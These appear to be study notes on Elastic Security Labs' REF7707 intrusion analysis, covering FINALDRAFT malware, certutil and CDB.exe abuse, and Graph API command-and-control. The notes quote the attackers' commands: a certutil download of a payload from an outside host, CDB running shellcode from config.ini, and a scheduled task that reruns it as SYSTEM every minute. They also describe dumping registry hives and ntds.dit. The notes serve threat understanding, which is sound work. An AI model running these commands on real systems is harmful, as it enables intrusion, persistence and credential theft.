https://www.elastic.co/security-labs/fragile-web-ref7707

# REF7707

Malware including FINALDRAFT, GUIDLOADER, and PATHLOADER

- Used a uncommon LOLBin to obtain endpoint execution
- LOLBin using **certuitl.exe** (used for displaying CA onfiguration, configure, etc)

certutil can be abused to download files:
- `fontdrvhost.exe`, `fontdrvhost.rar`, `config.ini`, and `wmsetup.log`
```
certutil  -urlcache -split -f https://[redacted]/fontdrvhost.exe C:\ProgramData\fontdrvhost.exe
```

Parent process was **WinrsHost.exe** , executing the above commands. Note that it is likely that attackers already posessed valid network credentials

Attackers first executed FontDrvHost.exe 
It was a renamed version of Windows signed debugger CDB.exe. 

Abusing this binary allowed attackers to execute shellcode deliverred in config.ini, under guise of trusted binaries

CDB is 15 year old debugger, seeing increased activity in 2021 and late 2024.

Documented LOLBas [great analysis](https://mrd0x.com/the-power-of-cdb-debugging-tool/)
```
C:\ProgramData\fontdrvhost.exe -cf C:\ProgramData\config.ini -o C:\ProgramData\fontdrvhost.exe
```
Spawned mspaint and injected shellcode into it

Additional shellcode injected into memory

Used ping to check connectivity to legit sites such as microsfotonline.

Then pinged digert.ictnsc[.]com which were adversary ownded

Executed script called SoftwareDistirbution, using diskshadow.exe, extracting SAM, SECUIRTY, SYSTEM Registry hives, and copied Active Direcotyr database (ntds.dit)

Persistence achieved via Scheduled Task that invoked CBD.exe, weaponize INI file every minute as SYSTEM
```
schtasks /create /RL HIGHEST /F /tn \"\\Microsoft\\Windows\\AppID\\EPolicyManager\" 
/tr \"C:\\ProgramData\\fontdrvhost.exe -cf C:\\ProgramData\\config.ini -o C:\\ProgramData\\fontdrvhost.exe\" 
/sc MINUTE /mo 1 /RU SYSTEM
```
 Malware analysis: https://www.elastic.co/security-labs/finaldraft

FINALDRAFT can establsih C2 via various means. 
Abuse of Microsoft Graph API is notable.

This minimizes indicators observable to network based IDS.

Encrypted payloads third party hosted also challenge the systems.
